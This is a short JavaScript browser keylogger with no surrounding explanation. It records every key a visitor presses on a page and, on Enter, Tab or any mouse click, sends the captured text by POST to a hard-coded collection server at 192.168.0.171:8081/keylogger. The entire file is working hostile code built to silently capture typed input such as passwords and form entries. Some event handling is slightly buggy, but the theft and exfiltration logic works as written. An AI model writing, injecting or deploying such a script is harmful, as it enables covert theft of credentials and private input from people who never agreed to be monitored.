var server = "http://192.168.0.171:8081/keylogger";

key = "";

document.onkeypress = function(e){
	if(e.keyCode === 13){
		event.preventDefault();
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(key + " <Press enter>");
        key = ""
	}
	else if(e.keyCode === 9){
		event.preventDefault();
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(key + " <Press tab>");
        key = ""
	}
	else{
		key += e.key;
	}
};

document.onclick = function(e){
        click = "";
		if(e.keyCode == 1){
			click = " <Left Click>";
		}else{
			click = " <Right Click>";
		}

		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(key + click);
        key = ""
};

